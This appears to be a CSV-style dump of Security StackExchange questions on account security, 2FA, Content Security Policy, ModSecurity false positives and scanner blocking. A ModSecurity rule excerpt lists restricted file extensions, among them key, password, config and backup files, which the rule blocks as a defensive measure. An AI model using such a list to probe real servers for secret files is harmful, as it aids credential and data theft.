Are these ""unusual activity"" real logins or is there an error in the Microsoft systems?
Can somebody crack a KeePass generated password with 245 bits (64 chars long)?
Where should we start investigating this situation which is greatly affecting our productivity?
[EDIT] I've managed to match one of the IP addresses to the owner.
See WhoIs information below:
WhoIs IP 40.68.25.96</p>

<p>NetRange:       40.64.0.0 - 40.71.255.255
CIDR:           40.64.0.0/13
NetName:        MSFT
NetHandle:      NET-40-64-0-0-1
Parent:         NET40 (NET-40-0-0-0-0)
NetType:        Direct Assignment
OriginAS:<br>
Organization:   Microsoft Corporation (MSFT)
RegDate:        2015-02-23
Updated:        2015-05-27
Ref:            <a href=""https://whois.arin.net/rest/net/NET-40-64-0-0-1"" rel=""nofollow noreferrer"">https://whois.arin.net/rest/net/NET-40-64-0-0-1</a></p>

<p>OrgName:        Microsoft Corporation
OrgId:          MSFT
Address:        One Microsoft Way
City:           Redmond
StateProv:      WA
PostalCode:     98052
Country:        US
RegDate:        1998-07-09
Updated:        2017-01-28
Comment:        To report suspected security issues specific to traffic emanating from Microsoft online services, including the distribution of malicious content or other illicit or illegal material through a Microsoft online service, please submit reports to:
Comment:        * <a href=""https://cert.microsoft.com"" rel=""nofollow noreferrer"">https://cert.microsoft.com</a>.<br>
Comment:<br>
Comment:        For SPAM and other abuse issues, such as Microsoft Accounts, please contact:
Comment:        * email@microsoft.com.<br>
Comment:<br>
Comment:        To report security vulnerabilities in Microsoft products and services, please contact:
Comment:        * email@microsoft.com.<br>
Comment:<br>
Comment:        For legal and law enforcement-related requests, please contact:
Comment:        * email@microsoft.com
Comment:<br>
Comment:        For routing, peering or DNS issues, please 
Comment:        contact:
Comment:        * email@microsoft.com
Ref:            <a href=""https://whois.arin.net/rest/org/MSFT"" rel=""nofollow noreferrer"">https://whois.arin.net/rest/org/MSFT</a></p>

<p>OrgAbuseHandle: MAC74-ARIN
OrgAbuseName:   Microsoft Abuse Contact
OrgAbusePhone:  +1-425-882-8080 
OrgAbuseEmail:  email@microsoft.com
OrgAbuseRef:    <a href=""https://whois.arin.net/rest/poc/MAC74-ARIN"" rel=""nofollow noreferrer"">https://whois.arin.net/rest/poc/MAC74-ARIN</a></p>

<p>OrgTechHandle: MRPD-ARIN
OrgTechName:   Microsoft Routing, Peering, and DNS
OrgTechPhone:  +1-425-882-8080 
OrgTechEmail:  email@microsoft.com
OrgTechRef:    <a href=""https://whois.arin.net/rest/poc/MRPD-ARIN"" rel=""nofollow noreferrer"">https://whois.arin.net/rest/poc/MRPD-ARIN</a></p>

<p>Now, what do I understand from that: is Microsoft having a communication issue between its departments or is Microsoft having a security issue and somebody is abusing their network or is somebody using Azure to crack Microsoft accounts?</p>

<p>[EDIT] I've changed again the password on my account and enabled two-factor authentication. I haven't seen unusual activity for the last 5 days. Maybe this will help other people as well.</p>
","52449","","52449","","2017-02-07 07:52:25","2017-02-07 07:52:25","""Unusual activity"" on multiple Microsoft accounts","<account-security><microsoft>","2","1","","","","CC BY-SA 3.0"
"149939","1","149941","","2017-01-31 12:39:47","","2","8689","<p>What are the security risks of encouraging, supporting and allowing shared logins to our website (username / password)?</p>

<p>This feature would allow some number of users, normally working for the same organization, to all use a single login to the website and perform the same functions as that login with no further identifying info.</p>

<p>Several users and some of the business stakeholders are asking that we support and encourage shared logins to one of our new websites. I have no idea why they are asking for this yet. The website does not have anything to do with the health industry and no financial information will be tracked in it.</p>

<p>There are immediately some architecture and UX problems I have with this 'feature' but I am looking for any security risks/concerns to back up my other gripes.</p>
","110194","","","","","2017-01-31 15:52:23","Are there any security risks with allowing shared accounts to website","<authentication><account-security>","3","1","","","","CC BY-SA 3.0"
"149949","1","149951","","2017-01-31 14:40:21","","0","252","<p>It used to be the case that authentication systems wouldn't confirm whether a user account existed and, instead, would simply report that the user logon name or password was incorrect.</p>

<p>Nowadays, a lot of authentication systems (particularly those for Google Accounts, Microsoft Accounts, etc) will (1) confirm that the user account exists by use of the submitted user logon name then (2) prompt for the password.</p>

<p>Why did this change?</p>
","29845","","98538","","2017-02-01 10:28:46","2017-02-01 10:28:46","User account existence confirmation","<account-security><user-enumeration>","1","1","","2017-02-01 20:38:58","","CC BY-SA 3.0"
"219123","1","","","2019-10-05 06:21:38","","1","155","<p>I have 2FA on ALL of my accounts. But my password was leaked in 7 breaches.
Unfortunately I have used the same password for most of the accounts.</p>

<p>Is it possible for him/her to bypass the 2FA?</p>
","215695","","","","","2019-10-05 07:26:03","What can a hacker do if I publish my email id and password but have 2FA on all of my accounts?","<encryption><account-security><decryption>","1","1","","","","CC BY-SA 4.0"
"219208","1","","","2019-10-07 13:51:44","","2","730","<p>I am tasked with adding a <a href=""https://developers.google.com/web/fundamentals/security/csp"" rel=""nofollow noreferrer"">content security policy</a> to a whole bunch of Magento stores to protect against credit card scraping code, which can sneak in via the store admin or GoogleTagManager* when a password leaks. Many of these stores are including assets (jQuery, Bootstrap, FontAwesome) from various CDNs (CDNJS, GoogleCDN).</p>

<p>In order for the resources to load, I will need to whitelist the entire CDN host.** This got me thinking:</p>

<h2>What is the likelihood that a malicious actor could get their own malicious code added to one of these CDNs?</h2>

<p>The alternative to whitelisting the CDN would be to move each CDN resource into the store's own codebase. That'd be extremely tedious and error prone, so I'd like to avoid that if possible.</p>

<p>* <a href=""https://www.w3.org/TR/CSP3/#match-paths"" rel=""nofollow noreferrer"">CSPv3 solves this problem by allowing whitelisting of a specific resource path</a>, but browsers likely won't support CSP3 for a long time as <a href=""https://caniuse.com/#feat=contentsecuritypolicy2"" rel=""nofollow noreferrer"">CSP2 still has limited support.</a></p>

<p>** I'm aware that the best solution here would be prevention of password leaks, but that is largely out of my control as clients regularly give marketing companies admin access to these resources.</p>

<p>Edit: After thinking more about this, whitelisting the CDNs themselves should not be an issue if the only objective is to prevent sensitive data from leaking to a 3rd party. That's because the CDN is only serving static files, and the malicious actor would still need to send the data to some server that can accept and store dynamic the data payload of PII/card data. Hoping that someone can validate or debunk this theory.</p>
","86398","","86398","","2019-10-07 19:02:12","2019-10-07 22:08:33","How safe is it to allow JS CDNs in a HTTP content security policy?","<web-application><malware><http><content-security-policy>","2","0","","","","CC BY-SA 4.0"
"219242","1","219245","","2019-10-08 08:17:27","","78","14582","<p>Most answers to <a href=""https://security.stackexchange.com/q/219216/15187"">this question about the security of satellite internet</a> boil down to: encrypting the message is more important than encrypting the method of transfer.</p>

<p>However, there seems to be a lot of focus on <a href=""https://arstechnica.com/gadgets/2019/03/802-eleventy-who-goes-there-wpa3-wi-fi-security-and-what-came-before-it/"" rel=""noreferrer"">wi-fi</a> <a href=""https://arstechnica.com/information-technology/2019/04/serious-flaws-leave-wpa3-vulnerable-to-hacks-that-steal-wi-fi-passwords/"" rel=""noreferrer"">security</a>.</p>

<p>For what threat models is wi-fi security important, and for what threat models is it just security theatre?</p>

<ol>
<li>Preventing others from using my wi-fi?  This could probably be done (more securely?) by explicitly authorising each device on the router.  Back in the day (early 2000s), I had to tell my university the MAC address for each device I wanted to use the internet with, although this was for wired internet (there was no campus-wide wifi yet).</li>
<li>Preventing others from sniffing on my wi-fi?  But we should rather encrypt on a higher layer (such as HTTPS)?</li>
<li>Are there other relevant threat models here?</li>
</ol>
","15187","","15187","","2019-10-11 11:01:19","2019-11-19 14:48:53","If we should encrypt the message rather than the method of transfer, why do we care about wifi security? Is this just security theatre?","<wifi><security-theater>","8","9","","","","CC BY-SA 4.0"
"219296","1","219300","","2019-10-08 22:56:36","","1","146","<p>Suppose I'm designing a system where I want to make sure that no single user who goes rogue can commit a malicious action.  (I'm ducking the question of how two or more users could collude.)  And I assume the machine is physically secure.</p>

<p>One possibility would be to require that the admin logon password be split between two people -- one person types in the first 10 characters, the second person types in the second 10 characters.  Account protocol dictates that any user who has a portion of the password can be responsible for actions committed from that account -- i.e., once the pair log in, both of them have to stay there and babysit each other until they log off from the account.  (Because it's annoying to require two people to be present, the overall architecture should be designed to require the minimum number of actions to be carried out from this privileged account, which is good design anyway.)</p>

<p>One problem is that this is brittle -- if one user becomes available, the whole account is inaccessible.</p>

<p>So, instead, the operating system can split the administrator account between 3 usernames, each with their own username and password.  The admin login screen presents 2 username/password forms, and to access the admin account, 2 out of 3 of those users have to enter their credentials.  This retains the property that no single user going rogue can access the admin account, but it also means that the account can still be accessed if 1 of the 3 users is unavailable.</p>

<p>This seems like a useful feature.  Does it have a name?  Does any operating system implement anything like this?</p>

<p>(I realize that things get complicated if, for example, you have an encrypted folder on the hard disk, which most systems handle by encrypting the folder in a way that incorporates the user's password as part of the decryption key.  If you want to make sure that the encrypted folder can be decrypted whenever 2 out of 3 users log in, but that no user by themselves can decrypt the folder with their password even if they have access to the data on the hard disk, then you need to encrypt it using a secret-sharing scheme such that 2 out of 3 secrets are enough to decrypt it but 1 is not.  This is, however, still doable.)</p>
","177952","","","","","2019-10-09 01:31:23","operating system requiring two or more users to access admin account","<account-security>","1","0","","","","CC BY-SA 4.0"
"150168","1","150178","","2017-02-02 12:43:52","","18","4371","<p>Is there a one time password generation algorithm (based on predefined secret and a changing value/time/counter/etc) that is simple enough that it can be processed by an average human but safe enough that the secret cannot be found with just a few passwords (say 5-10)?</p>

<p>I have seen questions on various specific password schemes and how secure they are. But I'd like to know more generally whether some well-know algorithms exist.</p>

<p>Intuition tells me, that if something is easy enough to be processed by a human, then its also easy to break. But then again I was very surprised that asymmetric encryption is possible, or secure key exchange (DH). So, surprise me! </p>

<hr>

<p><strong>Edit: Some clarification.</strong></p>

<p>The question came up when I was pondering about two-factor authentication for outdoor use. A typical two-factor authentication for safe environments (home, office, ...) uses a password and an OTP generator in a device or on your phone. You loose the device/phone, there's still the password. A keylogger steals your password, there's still the device/phone.</p>

<p>But what about situations where both could be stolen? For example, you use an app to pick up an e-bike on the street or to open a locker in a train station. Someone might watch while you enter the password on your phone and later also steal the phone itself. </p>

<p>The problem could be solved by using passwords that become useless within a short time frame (eg. 10min). In addition the phone would have an individual secret (e.g. SSL client certificate) to make brute-force attacks against the password authentication harder.</p>

<p>mr.spuratic's suggestion around Blum's HCMU algorithm is pretty close to what I was looking for. It still looks a little too heavy weight for the average human, but with some practicing it would be feasible.</p>
","138134","","138134","","2017-02-02 20:19:35","2017-02-02 20:19:35","One Time Password Algorithm for Humans","<passwords><cryptography><one-time-password><account-security>","4","3","","","","CC BY-SA 3.0"
"219449","1","","","2019-10-11 11:37:38","","3","251","<p>Entropy or randomness is a quantitative measure of security strength for various types of passcodes, but in current times with digital technology, breaches, and cracking tools it seems that lifetime should also be a factor in determining “strength”. For example, a low entropy password with a short lifetime may be as strong as a high entropy password that is seldom replaced. </p>

<p>Is there a quantitative approach to determine passcode strength using both entropy and time?</p>
","218470","","6253","","2019-10-11 11:53:19","2023-07-25 02:04:30","Quantify security strength from entropy and lifetime","<passwords><account-security><entropy>","2","3","","","","CC BY-SA 4.0"
"219466","1","","","2019-10-11 17:20:25","","0","105","<p>Yesterday my wife receive some emails from Sony confirming her purchases on Playstation Network. The only problem is: she was with my side watching Netflix on the smart Tv.
The purchased items is a pre-order of the new Call of Duty and an annual subscription to PS plus. <strong>We do not recognise this purchases, obviously.</strong></p>

<p>After changing the password and set up the 2-factor authentication, we tried to contact Playstation support to revert this purchases and get more information about this.</p>

<ol>
<li>Playstation Network web page does not have any Access Log feature;</li>
<li>In contact with the online support, they claim that the purchase was made by the device itself;</li>
<li>They also claims that they do not have any access log control;</li>
<li>They state that there nothing they can do.</li>
</ol>

<p><strong>Is it possible that Sony do not have any access log control?</strong></p>

<p><strong>Is there any law/regulation applied for cases like this?</strong></p>

<p><strong>NIST publications could be used as reference for juridical processes, regarding this?</strong></p>

<p>As an IT guys, I never saw any system without Access Log control. For me, their statement is bullshit.</p>

<p>Hope someone could help me clarify this. Thanks in advance for your time.</p>

<p>Reference: <a href=""https://www.nist.gov"" rel=""nofollow noreferrer"">https://www.nist.gov</a></p>
","219629","","","","","2019-10-11 17:20:25","Sony Access Log (Playstation Network) does not exists","<access-control><account-security><audit>","0","3","","","","CC BY-SA 4.0"
"219558","1","219564","","2019-10-13 23:30:11","","2","6169","<p>So in a CSP like the below:</p>

<p><code>content-security-policy: upgrade-insecure-requests; frame-ancestors 'self' https://stackexchange.com</code></p>

<p>Should the url part be quoted like this (example from mozilla security [1]) - even though this example has both styles:</p>

<pre><code># Disable unsafe inline/eval and plugins, only load scripts and stylesheets from same origin, fonts from google,
# and images from same origin and imgur. Sites should aim for policies like this.
Content-Security-Policy: default-src 'none'; font-src 'https://fonts.googleapis.com';
             img-src 'self' https://i.imgur.com; object-src 'none'; script-src 'self'; style-src 'self'
</code></pre>

<p>Or unquoted like this:</p>

<pre><code># Disable unsafe inline/eval, only load resources from same origin except also allow images from imgur
# Also disables the execution of plugins
Content-Security-Policy: default-src 'self'; img-src 'self' https://i.imgur.com; object-src 'none'
</code></pre>

<p>[1] Examples from here: <a href=""https://infosec.mozilla.org/guidelines/web_security#content-security-policy"" rel=""nofollow noreferrer"">https://infosec.mozilla.org/guidelines/web_security#content-security-policy</a></p>
","79965","","79965","","2019-10-15 00:37:51","2019-10-15 00:37:51","In a content security policy header: Should the url's be quoted or not, and is there any security implication to this decision?","<web-browser><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"219661","1","219665","","2019-10-16 00:46:48","","0","489","<p>I was looking for lots of information about cookies recently. What attracted me the most was the fact that cookies come in all forms and can be hijacked through arp poisining and spoofing on the local network or wirelessly.</p>

<p>I did not see one case that I would like to ask about.</p>

<p>Can a potential hacker literally crack and enumerate a random's user cookie and throw back the cracked cookie.</p>

<p>we assume that the website gets a lot of traffic and has many users signed in at the same time.</p>

<p>In case we want to be secure from this kind of attack we may log off the user after a certain period of time or globally use an https certificate but this isn't the main theme here.</p>
","219856","","","","","2019-10-16 03:08:35","Crack a single http cookie and gain access to a random user's account!","<http><cookies><account-security>","1","1","","2019-10-20 11:32:43","","CC BY-SA 4.0"
"219702","1","","","2019-10-16 18:38:56","","0","76","<p>Suppose you are designing software to manage bank balances for different accounts belonging to a given customer.  A single customer can have multiple accounts with a bank, such as a credit card account, a checking account, and a savings account.  You know that there will be a large number of applications running on the bank's servers to perform certain functions, such as transferring a minimum fixed amount every month from the user's checking account to the savings account.</p>

<p>So, a naive approach would be to expose a function such as ChangeAccountBalance().  Then when your app moves money from the checking account to the savings account, you do:
ChangeAccountBalance(checking_account_id, -transfer_amount);
ChangeAccountBalance(checking_account_id, transfer_amount);</p>

<p>The problem with this API is that every app which can call ChangeAccountBalance() could increase a person's balance arbitrarily, so an insider could use this to bump up their own balance.  This means every app which has access to that API now has to be reviewed with the highest possible scrutiny to prevent this attack.</p>

<p>So instead, suppose your API exposes a function:
TransferBetweenSameCustomerAccounts(first_account_id, second_account_id, amount);
which fails if first_account_id and second_account_id do not belong to the same customer.</p>

<p>Now, if an insider gains control of an app which can call that function, they can longer put free money into their account.  So the apps which can call that API can be reviewed with a lower level of scrutiny because the incentive to attack them is much less.  (You would still need a function like TransferBetweenDifferentCustomerAccounts() to move money between different customers, and any app that has access to that function gets reviewed with the higher scrutiny level.)</p>

<p>Does this ""balance-preserving"" security principle have a name?  Where applications need an API so that they can transfer something of value between different data stores, so you design the API so that when you move something from one balance to another controlled by the same user, the API enforces that you cannot increase the balance in one place without decreasing it somewhere else?</p>
","177952","","","","","2019-10-16 18:38:56","is there a name for security principle of ""balance-preserving functions""? (e.g. for bank balances)","<security-by-design>","0","4","","","","CC BY-SA 4.0"
"219750","1","","","2019-10-17 16:24:29","","1","2766","<p>When I enabled BitLocker on my system-drive, I wasn't asked to select an <a href=""https://www.howtogeek.com/192894/how-to-set-up-bitlocker-encryption-on-windows/"" rel=""nofollow noreferrer"">unlock-method</a>. I didn't have to enter any new passwords/keys. I only selected a few options for the encryption, and the process completed.</p>

<p>I'm not very familiar with how BitLocker works.</p>

<p>My questions are thus. With what key has my system-drive been encrypted? Is the key in any way related to the password for my Administrator-User-Account? How is it that I did not have to enter any new keys when setting up BitLocker or when booting the system?</p>
","161744","","","","","2020-08-18 09:45:22","Is User Account Login Related to BitLocker Encryption Key","<encryption><password-cracking><account-security><key-generation><bitlocker>","2","0","","","","CC BY-SA 4.0"
"219757","1","","","2019-10-17 19:27:26","","2","160","<p>Are off the shelf CSP alternatives like Ensighten used by BritishAirways any good/safe? As and example, the way the bootstrap script seems to work is to bind its own proxy methods to <code>XMLHttpRequest</code> <code>Open</code>/<code>Send</code> which then check the requested domain against the list of allowed domains. Anything attempting to talk to unapproved domains get a fake response. Is this approach as safe as CSP? Is it possible for any scripts to remove Ensighten's bindings and set it back to native code?</p>
","58811","","","","","2019-11-16 21:01:50","Off the shelf JavaScript based CSP alternative - is it safe?","<content-security-policy>","1","1","","","","CC BY-SA 4.0"
"83621","1","","","2015-03-12 09:30:09","","1","828","<p>I am trying to put modsecurity in apache 2.4.7 a reverse proxy for a tomcat applcation. For a normal request it's throwing lots of logs about allowed methods even though the method used is get.</p>

<pre><code>[Wed Mar 11 10:35:33.187404 2015] [:error] [pid 26124:tid 140113409455872] [client 41.66.208.198] ModSecurity: Warning. Match of ""within %{tx.allowed_methods}"" against ""REQUEST_METHOD"" required. [file ""/usr/share/modsecurity-crs/activated_rules/modsecurity_crs_30_http_policy.conf""] [line ""31""] [id ""960032""] [rev ""2""] [msg ""Method is not allowed by policy""] [data ""GET""] [severity ""CRITICAL""] [ver ""OWASP_CRS/2.2.8""] [maturity ""9""] [accuracy ""9""] [tag ""OWASP_CRS/POLICY/METHOD_NOT_ALLOWED""] [tag ""WASCTC/WASC-15""] [tag ""OWASP_TOP_10/A6""] [tag ""OWASP_AppSensor/RE1""] [tag ""PCI/12.1""] [hostname ""pentest.mydomain.com""] [uri ""/favicon.ico""] [unique_id ""VQAadQoAAGwAAGYM9ykAAABE""]
[Wed Mar 11 10:35:33.187627 2015] [:error] [pid 26124:tid 140113409455872] [client 41.66.208.198] ModSecurity: Warning. Match of ""within %{tx.allowed_http_versions}"" against ""REQUEST_PROTOCOL"" required. [file ""/usr/share/modsecurity-crs/activated_rules/modsecurity_crs_30_http_policy.conf""] [line ""78""] [id ""960034""] [rev ""2""] [msg ""HTTP protocol version is not allowed by policy""] [data ""HTTP/1.1""] [severity ""CRITICAL""] [ver ""OWASP_CRS/2.2.8""] [maturity ""9""] [accuracy ""9""] [tag ""OWASP_CRS/POLICY/PROTOCOL_NOT_ALLOWED""] [tag ""WASCTC/WASC-21""] [tag ""OWASP_TOP_10/A6""] [tag ""PCI/6.5.10""] [hostname ""pentest.mydomain.com""] [uri ""/favicon.ico""] [unique_id ""VQAadQoAAGwAAGYM9ykAAABE""]
</code></pre>

<p>But according to posts at <a href=""https://security.stackexchange.com/questions/38483/modsecurity-errors-related-to-request-method-http-1-1-and-get"">security.stackexchange</a> and <a href=""https://serverfault.com/questions/394052/broken-urls-after-enabling-mod-security"">serverfault</a> I should not have run into that issue. </p>

<p>I do have the following in /usr/share/modedurity-crs/modsecurity_crs_10_setup.conf </p>

<pre><code>#
# Set the following policy settings here and they will be propagated to the 30 rules
# file (modsecurity_crs_30_http_policy.conf) by using macro expansion.  
# If you run into false positves, you can adjust the settings here.
#
SecAction \
   ""id:'900012', \
    phase:1, \
    t:none, \
    setvar:'tx.allowed_methods=GET HEAD POST OPTIONS', \
    setvar:'tx.allowed_request_content_type=application/x-www-form-urlencoded|multipart/form-data|text/xml|application/xml|application/x-amf|application/json', \
    setvar:'tx.allowed_http_versions=HTTP/0.9 HTTP/1.0 HTTP/1.1', \
    setvar:'tx.restricted_extensions=.asa/ .asax/ .ascx/ .axd/ .backup/ .bak/ .bat/ .cdx/ .cer/ .cfg/ .cmd/ .com/ .config/ .conf/ .cs/ .csproj/ .csr/ .dat/ .db/ .dbf/ .dll/ .dos/ .htr/ .htw/ .ida/ .idc/ .idq/ .inc/ .ini/ .key/ .licx/ .lnk/ .log/ .mdb/ .old/ .pass/ .pdb/ .pol/ .printer/ .pwd/ .resources/ .resx/ .sql/ .sys/ .vb/ .vbs/ .vbproj/ .vsdisco/ .webinfo/ .xsd/ .xsx/', \
    setvar:'tx.restricted_headers=/Proxy-Connection/ /Lock-Token/ /Content-Range/ /Translate/ /via/ /if/', \
    nolog, \
    pass""
</code></pre>

<p>I have used libapache2-modsecurity package and here is what is in the /etc/apache2/mods-enabled/security2.conf file</p>

<pre><code> &lt;IfModule security2_module&gt;
    # Default Debian dir for modsecurity's persistent data
    SecDataDir /var/cache/modsecurity

    # Include all the *.conf files in /etc/modsecurity.
    # Keeping your local configuration in that directory
    # will allow for an easy upgrade of THIS file and
    # make your life easier
    IncludeOptional /etc/modsecurity/*.conf
    Include /usr/share/modsecurity-crs/activated_rules/*.conf
 &lt;/IfModule&gt;
</code></pre>

<p>Is there anything I am not doing well? I would appreciate if any one could shed some lights in there for me.</p>

<p>Thanks in advance</p>
","21129","","-1","","2017-04-13 12:13:53","2021-08-11 11:00:21","ModSecurity is behaving funnily in apache2.4 on ubuntu 14.04","<apache><mod-security><ubuntu>","3","0","","","","CC BY-SA 3.0"
"219935","1","219967","","2019-10-21 17:20:37","","1","399","<p><strong>Scenario:</strong> A high level access account on a single machine, where the account is created by the system/application with a secure password, without exposing the password to a human or to any other machines. </p>

<p>No one knows or can know the password.  (<em>Hypothetically the password could be extracted but only if the system is already compromised at the level of access the account has.</em>)  </p>

<p>Assume you are watching for and reporting on failed login attempts, you would know if anyone was trying to brute force the password.  </p>

<p>The <a href=""https://dba.stackexchange.com/q/250098/21924"">Real scenario where this occurs,</a> the argument is presented that changing the password, could/would raise the risk. </p>

<blockquote>
  <p>This leads to an argument where there is no good reason to actually change the password on a regular bases. You might want to change it on day one, if you don't trust the random password generation, but even that could add more risk then it removes, as now the password has been seen and processed with human contact.</p>
</blockquote>

<p>If no one knows a password, is there a reason to change it?</p>

<p><strong><em>Note:</strong> The example account exists as there is an alternate configuration of this solution, where the account is used to communicate between machines.  In the alternate solution the password is known by humans, and shared across devices. The current question is only about the single machine scenario.</em></p>
","24064","","","","","2019-10-22 10:50:46","If no one knows a password, is there a reason to change it?","<passwords><password-cracking><account-security>","3","3","0","","","CC BY-SA 4.0"
"219973","1","219980","","2019-10-22 06:39:59","","0","181","<p>I recently wanted to do some major changes to my account for an online game. So they wanted to do a thorough account verification. </p>

<p>First they asked me for some character information which can be easily gotten from the account as well as where the account was created. This seems like a great question because you can't see that information when logging into the account. </p>

<p>Then they asked for my current IP address (using a third party site like whatsmyip) and then asked me to create a dummy account. Creating a dummy account only requires an account name and an email address, you don't even need access to the email address. </p>

<p>Question: what is the point of creating a dummy account? What information helpful for account verification to they gain from that?</p>

<p>PS: I'm certain I talked to the actual support of the online game as the changes to my account where made and this could not have been done by a thirty party hacker.</p>
","220235","","","","","2019-10-22 07:47:38","Creating a dummy account for account verification","<account-security>","1","0","","","","CC BY-SA 4.0"
"220023","1","","","2019-10-22 20:42:41","","-1","411","<p>I was reading up on CSP's and I did some testing on a site which had one implemented, I found an xss vulnerability even though it was using a CSP. </p>
","219652","","98538","","2019-10-23 06:13:04","2019-10-23 06:13:04","How does a Content Security Policy help with preventing XSS and other injection vulnerabilities?","<xss><content-security-policy>","2","2","","2019-10-29 06:41:12","","CC BY-SA 4.0"
"220030","1","","","2019-10-22 22:52:55","","63","10729","<p>Everyone knows that two factors are better than one. My problem is that often the only second factor allowed is text messages sent to your mobile phone. This creates two concerns:</p>

<ol>
<li><p>I travel frequently overseas and lose access to 2FA accounts any time the associated SIM card can't touch a network.</p></li>
<li><p>Your phone is inherently your least secured device. I install way more software and download way more files on my phone than anywhere else with much less ability to verify sources or control access. For example, nearly every app requests sweeping permissions to function correctly. Even apps that aren't granted explicit permissions have been found to backdoor those permissions through google services.</p></li>
</ol>

<p>I feel like linking my phone to sensitive accounts (such as banking) would actually make them more exposed to attack and more difficult to maintain legitimate access.</p>
","220315","","113729","","2019-10-23 14:59:37","2019-10-26 13:51:48","Is 2FA via mobile phone still a good idea when phones are the most exposed device?","<authentication><android><multi-factor><account-security><permissions>","6","2","","","","CC BY-SA 4.0"
"220186","1","","","2019-10-25 05:23:47","","3","115","<h2>Story</h2>

<p>We are developing an API that which allow consumer to create or modify (i.e. upsert) objects stored in database via an endpoint with HTTP PUT.</p>

<p>The primary key of the object stored in this way is a GUID instead of an auto-increment number to prevent potential conflicts in future and it was decided that the GUID should be provided by API consumer in both scenario during object creation and modification.</p>

<p>We are being informed that the advantage of this approach allows us to focus the intention of storing objects without differentiate between create or modify.</p>

<h2>Question</h2>

<p>In this case, we expect the API consumer to pass a GUID as object identifier and what can go wrong security-wise if we allow someone else to decide the primary key of the object stored?</p>

<p>I understand I may treat the provided GUID as candidate key and generating another unique identifier internally but it seems redundant and wonder if it's a plausible approach.</p>
","146512","","146512","","2019-10-25 05:29:37","2019-10-27 02:00:08","What are the security implications of allowing API consumer to decide primary key stored in database?","<http><databases><api><security-by-design>","1","2","","","","CC BY-SA 4.0"
"11916","1","11960","","2012-02-19 18:13:59","","3","1945","<p>It's only an idea. I've recently logged that my server is scanned by w00tw00t tools.</p>

<p>I found many solutions to this, such as use of <strong>apache mod-security</strong>, <strong>fail2ban</strong>, etc..</p>

<p>The one I want to speak about, is usage of <strong>iptables</strong> to block such IP's, based on apache log matching. </p>

<p>If I would use any presented idea, about how to block those scanning address, we must point out important fact, which is <strong>requesting IP's are almost every time spoofed</strong>, which means, they don't belong to attacker.</p>

<p>Isn't this idea then causing damage to our common users? If I would block out IP, which was spoofed by attacker, I would block someone, who is not causing me a real damage, which means, in conclusion, <strong>none of the iptables based defense is usable</strong>, or am I wrong?</p>

<p>Or worse, could this server-side preventive measure be used as attack? Such as If I need prevent somebody from accessing site, I will spoof his IP and get it blocked by this preventive system using <strong>iptables blocking</strong>, isn't it?</p>

<p>Study material:<br>
<a href=""http://blog.urlvoid.com/w00tw00t-at-isc-sans-dfind-web-scanner/"" rel=""nofollow noreferrer"">http://blog.urlvoid.com/w00tw00t-at-isc-sans-dfind-web-scanner/</a><br>
<a href=""https://serverfault.com/q/125607/86062"">https://serverfault.com/questions/125607/dealing-with-http-w00tw00t-attacks</a><br>
<a href=""http://profi-admin.com/Articles/Showfull/06/05/2010/Administration/How-i-got-rid-of-the-w00tw00t-entries-in-my-server-logs"" rel=""nofollow noreferrer"">http://profi-admin.com/Articles/Showfull/06/05/2010/Administration/How-i-got-rid-of-the-w00tw00t-entries-in-my-server-logs</a><br>
<a href=""http://foxpa.ws/2010/07/14/using-dfind-exe-and-blocking-w00tw00t-at-isc-sans-dfind/"" rel=""nofollow noreferrer"">http://foxpa.ws/2010/07/14/using-dfind-exe-and-blocking-w00tw00t-at-isc-sans-dfind/</a><br>
<a href=""http://www.myatus.com/2010/07/17/blocking-w00tw00t-scans/"" rel=""nofollow noreferrer"">http://www.myatus.com/2010/07/17/blocking-w00tw00t-scans/</a><br>
<a href=""http://spamcleaner.org/en/misc/w00tw00t.html"" rel=""nofollow noreferrer"">http://spamcleaner.org/en/misc/w00tw00t.html</a>  </p>
","5367","","-1","","2017-04-13 12:13:53","2012-02-23 17:32:41","w00tw00t.at.ISC.SANS.DFind iptables fix - abusable?","<network><firewalls><mod-security>","1","1","","","","CC BY-SA 3.0"
"150969","1","151061","","2017-02-10 14:07:25","","4","1108","<p>Whatsapp <a href=""https://www.whatsapp.com/faq/en/general/26000021"" rel=""nofollow noreferrer"">has announced</a> that they are introducing 2FA to their service. Normally, services rely on a password (what you know), and adding 2FA means that they require an additional code sent via SMS to your phone (what you have), but until now Whatsapp has always used the code sent via SMS and no password, so in their case adding 2FA means adding the password. I am trying to understand why, exactly, this should be useful.</p>

<p>In the common scenario (a service that requires a password, like an email provider), if some hackers violate the site and access the user database, they can crack the password hashes and access users' accounts. Adding 2FA prevents this scenario, because even if they can find your password they still need your phone. So far so good. But in Whatsapp's case, what is the advantage?</p>

<p>Until now, those who wanted to access your account needed to steal your phone (and the code to unlock the screen), then they could do everything (including moving the account to another phone, or changing the associated phone number). Now, instead, they'd also need the password. But who would ever want to do this? Normally one who wants to access someone else's Whatsapp account is for example a jealous wife that wants to check whether her husband is cheating on her. If she can use her husband's phone, unlocked, it means she can read every message, and adding the password doesn't prevent her from doing it, so this is not the scenario that they want to prevent. If Whatsapp supported using the same account on more than one device, the jealous wife could briefly take his phone, get the code sent vis SMS, and configure her husband's Whatsapp account on another phone, unbeknownst to him; then she could keep spying on him even when he is away, for example on an alleged ""business trip"" (maybe he is careful enough to delete all the compromising messages before he comes back, so this trick could let her discover the truth). Here, the password would prevent her from doing it... But Whatsapp doesn't support using the same account on more than one device, so it doesn't matter.</p>

<p>Any attempt to move the account to another phone, or to change the associated number, doesn't make much sense either, as these attacks can't be kept secret: the victims would immediately notice that the account on their phone doesn't work anymore and take some countermeasures, like creating a new one and informing everyone to stop writing to the old one. Quickly, the stolen account would become useless. A password would prevent this, ok, but I don't think this is an important scenario.</p>

<p>Another case where the password could make sense is if the attacker is a skilled one who can intercept the SMS code used as verification. Again, this would make it possible to steal the account, but since Whatsapp doesn't support multiple devices, the victim would immediately notice that the account on his phone has stopped working, and again the attack would be almost useless.</p>

<p>The FAQ says that ""To help you remember your passcode, WhatsApp will periodically ask you to enter your passcode."" This would help those who don't lock the screen, but if a user doesn't care about locking the screen, why would he enable 2FA then? And the developers even admit that this periodical asking for the code is to help you remember it, not to increase the security.</p>

<p>The most plausible scenario I can think of is: a criminal gang that can intercept SMS messages from all over the world (!!!) steals accounts, moving them to another phone, and then sends the legitimate user an SMS saying ""If you want your account back, send us some bitcoins"". A password would prevent this, ok. But, seriously, should we worry about <em>this</em>?</p>

<p>So what is a realistic use case in which someone actually benefits from adding the password?</p>
